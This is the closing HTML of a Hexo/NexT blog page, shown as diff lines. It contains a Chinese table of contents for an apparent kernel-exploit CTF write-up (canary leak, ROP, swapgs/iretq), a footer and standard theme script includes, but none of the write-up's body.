+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#题目简述-amp-题目漏洞"><span class="nav-number">1.</span> <span class="nav-text">题目简述 &amp; 题目漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#利用过程"><span class="nav-number">2.</span> <span class="nav-text">利用过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#gdb调试"><span class="nav-number">2.1.</span> <span class="nav-text">gdb调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp组成"><span class="nav-number">2.2.</span> <span class="nav-text">exp组成</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#swapgs指令和iretq指令"><span class="nav-number">2.2.1.</span> <span class="nav-text">swapgs指令和iretq指令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取函数地址"><span class="nav-number">2.2.2.</span> <span class="nav-text">获取函数地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#泄露canary"><span class="nav-number">2.2.3.</span> <span class="nav-text">泄露canary</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#构造rop"><span class="nav-number">2.2.4.</span> <span class="nav-text">构造rop</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
